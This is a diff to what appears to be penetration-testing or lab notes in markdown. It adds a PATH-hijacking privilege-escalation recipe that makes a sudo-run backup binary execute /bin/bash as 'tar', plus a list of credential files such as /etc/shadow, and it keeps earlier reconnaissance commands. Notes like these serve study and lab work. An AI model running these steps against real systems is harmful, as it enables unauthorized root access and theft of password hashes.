@@ -69,6 +69,17 @@ ls -la /etc/shadow
 ls -la /etc/sudoers
 ```
 
+## Path injection:
+```bash
+# This command is runned as sudo from a binary /usr/bin/pandora_backup
+tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
+
+#We can change the path for tar with a bash binary
+echo "/bin/bash" > /var/tmp/tar
+chmod +x /var/tmp/tar
+export PATH=/var/tmp:$PATH
+/usr/bin/pandora_backup
+```
 ## Check if you are in a container:
 - Environment variables
 ```bash
@@ -84,3 +95,8 @@ ipconfig
 docker ps -a
 groups
 ```
+
+## Important files:
+- /etc/passwd
+- /etc/shadow
+- 
